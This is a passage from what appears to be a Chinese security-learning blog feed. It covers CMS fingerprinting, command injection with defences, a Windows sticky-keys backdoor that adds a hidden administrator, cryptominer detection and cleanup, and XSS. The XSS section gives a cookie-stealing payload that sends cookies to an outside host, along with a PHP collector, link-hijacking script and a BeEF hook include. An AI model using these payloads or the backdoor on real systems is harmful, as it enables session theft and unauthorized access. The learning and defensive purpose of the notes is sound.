class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以通过默认favicon.ico来判断CMS</span><br></pre></td></tr></table></figure><p>robots.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有些cms会有默认的robots.txt，可以通过robots.txt来判断CMS</span><br></pre></td></tr></table></figure><p>刻意构造错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误页面可以提供关于服务器的大量信息，可以构造错误来尝试得到404界面。</span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/PTE%E7%90%86%E8%AE%BA1/image-20200716103839018.png" alt="image-20200716103839018"></p><p>自动化指纹分析工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">whatweb</span><br><span class="line">wappalyzer</span><br><span class="line">天蝎指纹库</span><br><span class="line">plecost</span><br><span class="line">website analyzer</span><br><span class="line">cms-explorer</span><br><span class="line">shodan&#x2F;fofa&#x2F;zoomeye&#x2F;傻蛋</span><br></pre></td></tr></table></figure><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">窃听</span><br><span class="line">肩窥</span><br><span class="line">垃圾搜寻</span><br><span class="line">社交模仿</span><br></pre></td></tr></table></figure><p>社交网络SNS</p><p><img src="/2020/07/16/PTE%E7%90%86%E8%AE%BA1/image-20200716111209068.png" alt="image-20200716111209068"></p><h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><h4 id="渗透测试分类"><a href="#渗透测试分类" class="headerlink" title="渗透测试分类"></a>渗透测试分类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">黑盒测试</span><br><span class="line">白盒测试</span><br><span class="line">灰盒测试</span><br></pre></td></tr></table></figure><h4 id="渗透测试过程"><a href="#渗透测试过程" class="headerlink" title="渗透测试过程"></a>渗透测试过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">前期交互阶段</span><br><span class="line">情报收集阶段</span><br><span class="line">威胁建模阶段</span><br><span class="line">漏洞分析阶段</span><br><span class="line">渗透攻击阶段</span><br><span class="line">后渗透攻击阶段</span><br><span class="line">完成报告</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="PTE" scheme="http://yoursite.com/categories/PTE/"/>
    
    
      <category term="PTE" scheme="http://yoursite.com/tags/PTE/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统加固</title>
    <link href="http://yoursite.com/2020/07/10/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/"/>
    <id>http://yoursite.com/2020/07/10/Linux系统加固/</id>
    <published>2020-07-10T07:32:20.000Z</published>
    <updated>2020-07-10T07:34:07.844Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="Linux系统加固"><a href="#Linux系统加固" class="headerlink" title="Linux系统加固"></a>Linux系统加固</h1>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Linux系统安全" scheme="http://yoursite.com/categories/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Linux加固" scheme="http://yoursite.com/tags/Linux%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="http://yoursite.com/2020/07/10/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/07/10/命令执行漏洞/</id>
    <published>2020-07-10T06:48:37.000Z</published>
    <updated>2020-07-10T06:56:23.781Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="什么是命令执行"><a href="#什么是命令执行" class="headerlink" title="什么是命令执行"></a>什么是命令执行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.原理</span><br><span class="line">Web应用程序接收用户输入，拼接到要执行的系统命令中执行。</span><br><span class="line">产生原因：</span><br><span class="line">用户输入未过滤或净化</span><br><span class="line">拼接到系统命令中执行</span><br><span class="line"></span><br><span class="line">2.PHP下的命令执行函数</span><br><span class="line">system</span><br><span class="line">exec</span><br><span class="line">shell_exec</span><br><span class="line">passthru</span><br><span class="line">popen</span><br><span class="line">proc_popen</span><br><span class="line"></span><br><span class="line">payload示例：</span><br><span class="line">xxx.xxx.com&#x2F;?cmd&#x3D;ipconfig</span><br></pre></td></tr></table></figure><h2 id="windows下命令执行"><a href="#windows下命令执行" class="headerlink" title="windows下命令执行"></a>windows下命令执行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.利用思路</span><br><span class="line">当代码中拼接用户的输入并带入system函数执行，但无法直接执行用户的自定义命令。</span><br><span class="line">思路：</span><br><span class="line">截断输入，重新拼接，两条命令都输入并执行。</span><br><span class="line"></span><br><span class="line">2.命令执行漏洞拼接符</span><br><span class="line">在windows系统下的cmd命令，有以下截断拼接符：</span><br><span class="line">&amp;前面的语句为假则直接执行后面的</span><br><span class="line">&amp;&amp;前面的语句为假则直接出错，后面的也不执行</span><br><span class="line">|直接执行后面的语句</span><br><span class="line">||前面出错执行后面的</span><br><span class="line"></span><br><span class="line">正常情况下ping 127.0.0.1</span><br><span class="line">ping 111 &amp; ipconfig</span><br><span class="line">ping 127.0.0.1 &amp;&amp; ipconfig</span><br><span class="line">ping 127.0.0.1 | ipconfig</span><br><span class="line">ping 111 || ipconfig</span><br></pre></td></tr></table></figure><h2 id="Linux下命令执行"><a href="#Linux下命令执行" class="headerlink" title="Linux下命令执行"></a>Linux下命令执行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.命令执行漏洞拼接符</span><br><span class="line">在Linux系统下的shell命令中，有以下一些截断拼接符：</span><br><span class="line">;执行完前面的执行后面的</span><br><span class="line">|管道符，显示后面的执行结果</span><br><span class="line">||当前面的执行出错时执行后面的</span><br><span class="line">&amp;无论前边语句真假都会执行</span><br><span class="line">&amp;&amp;只有前面语句为真，才会执行后边语句</span><br></pre></td></tr></table></figure><h2 id="命令执行自动化测试工具"><a href="#命令执行自动化测试工具" class="headerlink" title="命令执行自动化测试工具"></a>命令执行自动化测试工具</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.COmmix</span><br><span class="line">commix是一个使用Python开发的漏洞测试工具，用于测试一个请求是否存在命令执行漏洞，可直接导入burp的历史记录进行检测。</span><br><span class="line">项目地址：https:&#x2F;&#x2F;github.com&#x2F;stasinopoulos&#x2F;commix</span><br><span class="line">在kali中自带了commix工具</span><br><span class="line"></span><br><span class="line">2.commix工具基本使用</span><br><span class="line">commix -u xxx.xxx.com&#x2F;test.php?cmd&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">避免或少用执行命令的函数或者直接禁用；</span><br><span class="line">进入执行命令的函数&#x2F;方法之前，对参数进行过滤，对敏感字符进行转义；</span><br><span class="line">disable_functions中禁用执行命令的函数；</span><br><span class="line">对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤；</span><br><span class="line">对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤；</span><br><span class="line">参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/network/154670.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/154670.html</a></p><p>命令执行漏洞综合分析：</p><p><a href="http://www.hetianlab.com/cour.do?w=1&amp;c=C9d6c0ca797abec2016071516463300001" target="_blank" rel="noopener">http://www.hetianlab.com/cour.do?w=1&amp;c=C9d6c0ca797abec2016071516463300001</a></p><p>ImageMagick命令执行漏洞：</p><p><a href="http://www.hetianlab.com/expc.do?ce=8700261e-dbcd-4a3a-aad4-1ad74de4a091" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=8700261e-dbcd-4a3a-aad4-1ad74de4a091</a></p><p>Struts2(s2-045)远程命令执行：</p><p><a href="http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017031012041000001" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017031012041000001</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>win2003-shift后门</title>
    <link href="http://yoursite.com/2020/07/10/win2003-shift%E5%90%8E%E9%97%A8/"/>
    <id>http://yoursite.com/2020/07/10/win2003-shift后门/</id>
    <published>2020-07-10T05:27:52.000Z</published>
    <updated>2020-07-10T05:48:41.373Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="Win2003-shift后门"><a href="#Win2003-shift后门" class="headerlink" title="Win2003 shift后门"></a>Win2003 shift后门</h1><h2 id="shift键"><a href="#shift键" class="headerlink" title="shift键"></a>shift键</h2><p> Windows中的粘滞键是专为同时按下两个或多个键有困难的人设计的。粘滞键的主要功能是方便Shift、Ctrl、Alt与其他键的组合使用。在我们使用热键时，例如“CTRL+C”，用粘滞键就可以一次只按一个键来完成复制的功能。</p><p><img src="/2020/07/10/win2003-shift%E5%90%8E%E9%97%A8/image-20200710133156606.png" alt="image-20200710133156606"></p><p>启动粘滞键可通过单击“开始→设置→控制面板→辅助功能选项”，在“键盘”选项卡下选中“使用粘滞键”来启动。在开启粘滞键的时候，任务栏右边的系统托盘区会出现粘滞键图标。如果想关闭粘滞键，只需将“使用粘滞键”前的钩消除就可以。</p><h2 id="系统后门"><a href="#系统后门" class="headerlink" title="系统后门"></a>系统后门</h2><p> 后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。  后门是一种登录系统的方法，它不仅绕过系统已有的安全设置，而且还能挫败系统上各种增强的安全设置。</p><p>后门程序又称特洛依木马，其用途在于潜伏在电脑中，从事搜集信息或便于黑客进入的动作。后门程序和电脑病毒最大的差别，在于后门程序不一定有自我复制的动作，也就是后门程序不一定会“感染”其它电脑。</p><p>系统级的后门才是最好的后门，因为他不易被发现，利用系统的漏洞来利用，通过将原系统文件替换，一般不去检查对应文件大小或者原文件位置比对的话，很难被发现。</p><h2 id="shift后门制作"><a href="#shift后门制作" class="headerlink" title="shift后门制作"></a>shift后门制作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">点击开始 -&gt; 运行，在运行的对话框中输入cmd回车</span><br><span class="line">切换至system32目录：cd c:\windows\system32</span><br></pre></td></tr></table></figure><p>备份sethc.exe </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move sethc.exe sethc.exe.bak</span><br></pre></td></tr></table></figure><p>将cmd.exe改成为sethc.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure><h2 id="登录shift后门"><a href="#登录shift后门" class="headerlink" title="登录shift后门"></a>登录shift后门</h2><p>点击开始 -&gt; 运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入mstsc，打开远程桌面，进入登录界面后</span><br><span class="line">连续按5次shift键，激活后门程序</span><br></pre></td></tr></table></figure><p>输入net user查看当前账户信息</p><p><img src="/2020/07/10/win2003-shift%E5%90%8E%E9%97%A8/image-20200710134415502.png" alt="image-20200710134415502"></p><p>新建用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test 123456 &#x2F;add</span><br></pre></td></tr></table></figure><p>将新加用户添加至administrators组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators test &#x2F;add</span><br></pre></td></tr></table></figure><p>激活账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test &#x2F;active:yes</span><br></pre></td></tr></table></figure><p>输入新加账户和密码进入目标主机</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Windows系统安全" scheme="http://yoursite.com/categories/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="win2003" scheme="http://yoursite.com/tags/win2003/"/>
    
  </entry>
  
  <entry>
    <title>恶意挖矿清除常规步骤</title>
    <link href="http://yoursite.com/2020/07/10/%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E6%B8%85%E9%99%A4%E5%B8%B8%E8%A7%84%E6%AD%A5%E9%AA%A4/"/>
    <id>http://yoursite.com/2020/07/10/恶意挖矿清除常规步骤/</id>
    <published>2020-07-10T05:11:54.000Z</published>
    <updated>2020-07-10T05:21:27.550Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="恶意挖矿清除"><a href="#恶意挖矿清除" class="headerlink" title="恶意挖矿清除"></a>恶意挖矿清除</h1><h2 id="清除恶意程序计划任务"><a href="#清除恶意程序计划任务" class="headerlink" title="清除恶意程序计划任务"></a>清除恶意程序计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编辑 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 和&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br><span class="line">删除恶意计划任务内容</span><br></pre></td></tr></table></figure><h2 id="杀死恶意程序进程"><a href="#杀死恶意程序进程" class="headerlink" title="杀死恶意程序进程"></a>杀死恶意程序进程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在知道恶意程序名称情况下：</span><br><span class="line">ps -ef | grep 恶意程序名称</span><br></pre></td></tr></table></figure><p>在定位到恶意程序在系统中的位置后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkill 直接杀死程序</span><br><span class="line">Kill -9 PID</span><br></pre></td></tr></table></figure><h2 id="清除恶意程序"><a href="#清除恶意程序" class="headerlink" title="清除恶意程序"></a>清除恶意程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm –rf 恶意程序物理地址</span><br></pre></td></tr></table></figure><h2 id="iptables禁止恶意程序联网"><a href="#iptables禁止恶意程序联网" class="headerlink" title="iptables禁止恶意程序联网"></a>iptables禁止恶意程序联网</h2><p>检查恶意程序外网互联地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat –pantul | grep ESTAB</span><br></pre></td></tr></table></figure><p>下发外网访问控制策略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">依据查询出的外网互联地址，直接下发访问控制策略，禁止服务访问这些网络地址</span><br><span class="line">iptables –A OUTPUT –d xx.x.xx.xx –j DROP</span><br><span class="line">重启设备</span><br></pre></td></tr></table></figure><h2 id="重做系统"><a href="#重做系统" class="headerlink" title="重做系统"></a>重做系统</h2><p>中了恶意程序的机器，在清除恶意程序后，最后都要重做系统。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="恶意代码" scheme="http://yoursite.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="挖矿" scheme="http://yoursite.com/tags/%E6%8C%96%E7%9F%BF/"/>
    
  </entry>
  
  <entry>
    <title>检测恶意挖矿</title>
    <link href="http://yoursite.com/2020/07/10/%E6%A3%80%E6%B5%8B%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF/"/>
    <id>http://yoursite.com/2020/07/10/检测恶意挖矿/</id>
    <published>2020-07-10T04:00:22.000Z</published>
    <updated>2020-07-10T04:13:49.988Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="Linux下检测恶意挖矿行为"><a href="#Linux下检测恶意挖矿行为" class="headerlink" title="Linux下检测恶意挖矿行为"></a>Linux下检测恶意挖矿行为</h1><h2 id="Linux知识"><a href="#Linux知识" class="headerlink" title="Linux知识"></a>Linux知识</h2><p>ps命令：可查看当前系统的进程状态，搭配kill指令随时中断、删除不必要的程序。使用该命令可以确定有哪些进程正在运行和运行的状态等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill进程：kill -9 进程id</span><br></pre></td></tr></table></figure><p>top命令：实时动态地查看系统的整体运行情况。</p><p>netstat 命令：查看Linux系统中网络系统的状态信息。</p><p>cron服务：计划任务</p><h2 id="异常进程排查"><a href="#异常进程排查" class="headerlink" title="异常进程排查"></a>异常进程排查</h2><p>1.查看进程使用CPU和内存的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top –c</span><br></pre></td></tr></table></figure><p>-c参数可直接查找到异常程序的物理位置。通过查看消耗CPU和内存较多的程序是否是未知程序。</p><p>2.grep 恶意程序名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果知道恶意程序的名称，直接通过ps –ef | grep 恶意进程名称</span><br></pre></td></tr></table></figure><h2 id="异常会话排查"><a href="#异常会话排查" class="headerlink" title="异常会话排查"></a>异常会话排查</h2><p>查看是否有异常会话连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat –pantul | grep ESTAB</span><br></pre></td></tr></table></figure><h2 id="计划任务排查"><a href="#计划任务排查" class="headerlink" title="计划任务排查"></a>计划任务排查</h2><p>1.查看是否存在异常未知任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询当前计划任务中是否存在异常未知任务:</span><br><span class="line">crontab –l</span><br></pre></td></tr></table></figure><p>2.查看root用户任务计划</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</span><br></pre></td></tr></table></figure><p>3.查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>【https:]//www[.]hetianlab.com/expc.do?ce=94f48620-eda1-4939-b0a1-34154279dc3d</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="恶意代码" scheme="http://yoursite.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="挖矿" scheme="http://yoursite.com/tags/%E6%8C%96%E7%9F%BF/"/>
    
  </entry>
  
  <entry>
    <title>XSS漏洞及防御</title>
    <link href="http://yoursite.com/2020/07/05/XSS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E5%BE%A1/"/>
    <id>http://yoursite.com/2020/07/05/XSS漏洞及防御/</id>
    <published>2020-07-05T08:55:26.000Z</published>
    <updated>2020-07-05T08:58:31.060Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS漏洞：</p><p>跨站脚本攻击，为了不和层叠样式表的CSS混肴，缩写为XSS。<br>恶意攻击者在浏览器web界面插入恶意script代码，当用户浏览该页面时，嵌入其中的script代码会被执行，从而达到恶意攻击用户的目的。</p><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.反射型XSS</span><br><span class="line">反射型XSS的攻击往往具有一次性。</span><br><span class="line"></span><br><span class="line">2.存储型XSS</span><br><span class="line">持久性XSS，攻击脚本存储在目标服务器中，每次访问该页面的用户都会被攻击。</span><br><span class="line"></span><br><span class="line">3.DOM型XSS</span><br><span class="line">全称Document Object Model，使用DOM动态访问更新文档的内容、结构及样式。</span><br><span class="line">HTML标签都是节点，节点组成了节点树，通过HTML DOM可以对树上所有节点进行修改。</span><br></pre></td></tr></table></figure><h2 id="XSS盗取cookie"><a href="#XSS盗取cookie" class="headerlink" title="XSS盗取cookie"></a>XSS盗取cookie</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.cookie</span><br><span class="line">cookie是HTTP协议下，服务器维护用户信息的方式。cookie是由web服务器保存在用户浏览器上的小文本文件，包含相关用户信息。</span><br><span class="line">有些cookie是临时的，有的是持续的。临时的cookie只在浏览器上保存一段时间，一旦超过规定时间，该cookie就会被系统清除。</span><br><span class="line"></span><br><span class="line">服务器可以利用cookie包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。</span><br><span class="line">cookies最典型的应用是判定注册用户是否已经登录网站，会提示用户是否保留用户信息以便下次登录。</span><br><span class="line"></span><br><span class="line">2.反射型XSS盗取cookie</span><br><span class="line">存在反射型XSS漏洞的站点，可以利用以下链接来盗取cookie：</span><br><span class="line">url?uanme&#x3D;&lt;script&gt;document.location&#x3D;&#39;http:&#x2F;&#x2F;ip&#x2F;cookie.php?cookie&#x3D;&#39;+docunment.cookie&lt;&#x2F;script&gt;</span><br><span class="line">将链接发送给用户，用户点击即触发XSS漏洞。</span><br><span class="line"></span><br><span class="line">cookie.php代码：</span><br><span class="line">&lt;?php</span><br><span class="line">$cookie&#x3D;$_GET[&#39;cookie&#39;];</span><br><span class="line">file_put_contents(&#39;cookie.txt&#39;,$cookie);</span><br><span class="line">?&gt;</span><br><span class="line">http:&#x2F;&#x2F;xxx.xxx.com&#x2F;?name&#x3D;&lt;script&gt;docunment.location&#x3D;&#39;http:&#x2F;&#x2F;xxx.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">3.利用cookie会话劫持</span><br><span class="line">打开偷到的cookie，找到cookie值，访问目标站点，修改cookie为偷到的cookie内容。</span><br><span class="line"></span><br><span class="line">3.劫持会话后的操作</span><br><span class="line">进入后台上传webshell；</span><br><span class="line">修改配置</span><br></pre></td></tr></table></figure><h2 id="XSS篡改网页链接"><a href="#XSS篡改网页链接" class="headerlink" title="XSS篡改网页链接"></a>XSS篡改网页链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.JS代码</span><br><span class="line">window.onload 当窗口加载时，执行匿名函数。</span><br><span class="line"></span><br><span class="line">使用for循环遍历所有获得的链接a标签:</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload&#x3D;function()&#123;</span><br><span class="line">var link&#x3D;cocument.getElmentsByTagName(&quot;a&quot;);</span><br><span class="line">for(j&#x3D;0;j&lt;link.length;j++)</span><br><span class="line">&#123;</span><br><span class="line">link[j].href&#x3D;&quot;http:&#x2F;&#x2F;attacker-site.com&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">2.XSS篡改链接</span><br><span class="line">将篡改的代码注入到对应的XSS位置。</span><br><span class="line"></span><br><span class="line">3.篡改链接指向流量网站</span><br><span class="line">刷流量，某些站点的重定向。</span><br><span class="line"></span><br><span class="line">4.篡改链接指向恶意URL</span><br><span class="line">使用Beef进行恶意链接生成，以及利用hook.js执行其他命令。</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;xxx.xx.xx.xx:xxx&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS盗取用户信息"><a href="#XSS盗取用户信息" class="headerlink" title="XSS盗取用户信息"></a>XSS盗取用户信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.盗取用户信息原理</span><br><span class="line">克隆网站登录页面，利用存储XSS设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，用户名、密码被存储。</span><br><span class="line"></span><br><span class="line">2.setookit工具克隆网站</span><br><span class="line">kali自带社工工具。</span><br><span class="line"></span><br><span class="line">3.存储XSS跳转克隆网站</span><br><span class="line">XSS payload：</span><br><span class="line">&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;xxx.x.x.xx&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="没有过滤的XSS"><a href="#没有过滤的XSS" class="headerlink" title="没有过滤的XSS"></a>没有过滤的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td 